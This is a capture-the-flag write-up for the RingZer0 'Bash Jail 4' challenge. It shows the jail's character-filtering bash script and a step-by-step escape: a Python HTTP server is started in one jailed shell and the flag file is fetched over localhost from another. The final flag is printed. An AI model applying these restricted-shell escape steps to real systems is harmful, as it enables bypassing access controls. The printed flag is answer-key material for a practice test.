# Bash Jail 4

## Challenge Details 

- **CTF:** RingZer0
- **Category:** Jail Escaping
- **Points:** 4

## Provided Materials

- SSH credentials

## Solution

Challenge bash code:

```sh
WARNING: this prompt is launched using ./prompt.sh 2>/dev/null

function check_space {
	if [[ $1 == *[bdksc'/''<''>''&''$']* ]]
	then 	
    		return 0
	fi

	return 1
}

while :
do
	echo "Your input:"
	read input
	if check_space "$input" 
	then
		echo -e '\033[0;31mRestricted characters has been used\033[0m'
	else
		output=`$input < /dev/null` &>/dev/null
		echo "Command executed"
	fi
done 
```

We can't use now stream redirection and the `output` command sends now our output to `/dev/null`. But we could establish `bash` shell in `level1`, so in our `level4` shell we can start `python` server and request the flag from the `level1` shell.

`level4`:

```sh
Your input:
python -m SimpleHTTPServer 12345
```

`level1`:

```sh
Your input:
bash
level1@jail-bash:~$ python >&0
>>> import urllib2
>>> urllib2.urlopen("http://127.0.0.1:12345/flag.txt").read()
'FLAG-OTQKB0274fwtxk3v2rTLCd0l5v7KNp7F\n'
```


## Final Flag

`FLAG-OTQKB0274fwtxk3v2rTLCd0l5v7KNp7F`

*Created by [bu19akov](https://github.com/bu19akov)*